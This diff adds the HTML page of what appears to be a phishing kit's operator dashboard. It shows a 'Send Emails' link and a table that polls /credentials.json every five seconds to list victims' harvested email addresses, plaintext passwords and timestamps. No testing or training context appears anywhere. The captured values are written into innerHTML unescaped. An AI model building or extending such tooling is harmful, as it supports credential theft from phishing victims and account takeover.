@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Campaign Dashboard</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body { background-color: #f3f4f6; }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+    </style>
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="bg-blue-600 text-white p-4 shadow-md">
+        <div class="container mx-auto flex justify-between items-center">
+            <h1 class="text-lg font-bold">Phishing</h1>
+            <a href="/send-emails" class="bg-white text-blue-600 px-4 py-2 rounded-md hover:bg-gray-100">Send Emails</a>
+        </div>
+    </nav>
+
+    <div class="container mt-10">
+        <div class="bg-white p-6 rounded-lg shadow-lg">
+            <h2 class="text-2xl font-bold mb-4 text-center">Phishing Campaign Dashboard</h2>
+            <table class="w-full table-auto">
+                <thead>
+                    <tr class="bg-gray-200">
+                        <th class="px-4 py-2">Email</th>
+                        <th class="px-4 py-2">Password</th>
+                        <th class="px-4 py-2">Timestamp</th>
+                    </tr>
+                </thead>
+                <tbody id="credentialsTable"></tbody>
+            </table>
+        </div>
+    </div>
+    <script>
+        async function loadCredentials() {
+            try {
+                const response = await fetch('/credentials.json');
+                if (!response.ok) {
+                    console.error('Failed to fetch credentials:', response.status);
+                    return;
+                }
+                const credentials = await response.json();
+                const tableBody = document.getElementById('credentialsTable');
+                tableBody.innerHTML = '';
+                credentials.forEach(cred => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td class="border px-4 py-2">${cred.email}</td>
+                        <td class="border px-4 py-2">${cred.password}</td>
+                        <td class="border px-4 py-2">${cred.timestamp}</td>
+                    `;
+                    tableBody.appendChild(row);
+                });
+            } catch (error) {
+                console.error('Error loading credentials:', error);
+            }
+        }
+        loadCredentials();
+        setInterval(loadCredentials, 5000);
+    </script>
+</body>
+</html>
